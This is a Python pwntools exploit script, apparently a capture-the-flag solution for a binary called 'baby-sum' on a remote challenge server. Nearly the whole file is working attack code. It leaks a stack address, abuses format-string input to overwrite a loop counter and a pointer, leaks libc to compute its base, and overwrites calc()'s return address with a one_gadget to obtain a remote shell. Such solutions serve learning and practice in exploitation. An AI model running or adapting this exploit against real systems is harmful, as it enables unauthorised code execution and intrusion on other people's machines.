#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
context.update(arch="amd64", os="linux")

exe = context.binary = ELF('./baby-sum')
libc = ELF('./libc.so.6')

host = args.HOST or '35.244.10.136'
port = int(args.PORT or 10252)

io = connect(host, port)

io.recvuntil('you: ', drop=True)
# first we read the given stack leak
stack = int(io.recvuntil('\n',drop=True),16)
print('leak stack = '+hex(stack))

# the name 6th entry will be on stack untouched, so we put a pointer
name = 'A'*40+p64(stack+0x30)

io.sendlineafter('you?\n', name)

io.sendlineafter('> ', '%1$p')
io.sendlineafter('> ', '%13$n')         # clear the i counter variable
io.sendlineafter('> ', '%ld')           # replace '%8s' string by '%ld'  no we can input numbers one by one
io.sendlineafter('> ' ,'-')             # pass the input, without writing anything
io.sendlineafter('> ' ,'-100')          # overwrite i variable with -100 (after all it is an int64)
io.sendlineafter('> ', str(stack-0x58)) # overwrite num variable to point before on stack containing a libc address, to leak it

# get our libc leak & calculate libc base
libc.address = u64(io.recvuntil('\n', drop=True).ljust(8,b'\x00')) - 0x1ec6a0
print('libc base = '+hex(libc.address))

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

onegadgets = one_gadget('libc.so.6', libc.address)

for i in range(16):
  io.sendlineafter('> ' ,'-')

io.sendlineafter('> ' ,'0')		# set i counter to 0 again (3 writes is all we need)
io.sendlineafter('> ' ,'-')
io.sendlineafter('> ' ,'-')
io.sendlineafter('> ' , str(onegadgets[1]))  # write onegadget to calc() return address , at this points i>2,  so calc() will return to our onegadget

# got shell now
io.interactive()

